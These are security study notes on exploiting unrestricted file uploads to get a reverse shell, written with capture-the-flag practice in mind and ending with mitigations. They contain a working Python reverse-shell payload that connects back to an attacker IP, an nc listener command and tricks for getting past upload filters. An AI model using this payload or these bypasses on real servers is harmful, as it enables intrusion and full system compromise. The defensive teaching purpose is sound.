
**🛑 Unrestricted File Upload → Reverse Shell – Summary**

---

### 📌 Overview
- **Vulnerability**: Allows uploading files without proper validation of type, extension, MIME, content, execution permissions, or directory access controls.  
- **Consequence**: An attacker can place a malicious script on the server, achieve **Remote Code Execution (RCE)**, and obtain a **reverse shell**.

---

### 🔥 Attack Flow

| Step | Action | Key Details |
|------|--------|--------------|
| **1️⃣ Identify upload points** | Look for profile pictures, document uploads, ticket attachments, admin/CMS panels, etc. | Typical endpoints: `/upload`, `/profile/upload`, `/admin/media` |
| **2️⃣ Craft payload** | Create a reverse‑shell script (e.g., Python) that connects back to the attacker. | Example payload uses `socket`, `dup2`, and `pty.spawn("sh")`. |
| **3️⃣ Start listener** | `nc -lvnp <attacker‑port>` (e.g., `1234`). |
| **4️⃣ Upload malicious file** | Name the file with an allowed extension (e.g., `test.py`). If the server stores it in a web‑accessible, executable location, access it via `http://victim.com/uploads/test.py`. |
| **5️⃣ Trigger & gain shell** | When the file is requested/executed, the reverse shell connects back, giving the attacker a command line on the victim host. |
| **6️⃣ Post‑exploitation** | Enumerate, privilege‑escalate, dump credentials, move laterally, establish persistence. |

---

### 📡 Example Payload (Python)  

```python
import socket, subprocess, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.49.111.127", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("sh")
```

*Listener:* `nc -lvnp 1234`

---

### 🧠 Common Bypass Techniques
- **Extension tricks**: `.phtml`, `.php5`, double extensions (`shell.php.jpg`).  
- **MIME spoofing**: Alter `Content‑Type` header.  
- **Image validation bypass**: Embed code in image metadata or use malformed images.  

---

### 🔐 Impact (Critical)
- Remote Code Execution  
- Full reverse‑shell access  
- Complete server compromise (credential theft, lateral movement, ransomware, etc.)

---

### 🛡️ Prevention & Mitigation
1. **Strict whitelist** of allowed file extensions; enforce server‑side checks.  
2. **Rename uploads** to random UUIDs, discard original filenames.  
3. **Store files outside the web root** (e.g., `/var/storage/uploads`).  
4. **Disable script execution** in the upload directory (Apache `php_admin_flag engine off`, Nginx `default_type text/plain`).  
5. **Validate file content** (magic bytes, deep inspection).  
6. **Run web server with least privilege** (no root, no execute permission on upload folder).

---

### 🧪 CTF Exploitation Flow (Visual)
```
Find upload feature
   ↓
Test allowed extensions
   ↓
Upload reverse‑shell script
   ↓
Start listener (nc)
   ↓
Trigger the uploaded file
   ↓
Obtain shell → Escalate → Capture flag
```

---

### 🏁 Key Takeaway
An unrestricted file upload is a high‑risk vector that often serves as a direct path to **RCE** and **reverse shells**, granting attackers full control over the target server. Treat any file‑upload functionality as a critical attack surface and apply the hardening steps above.
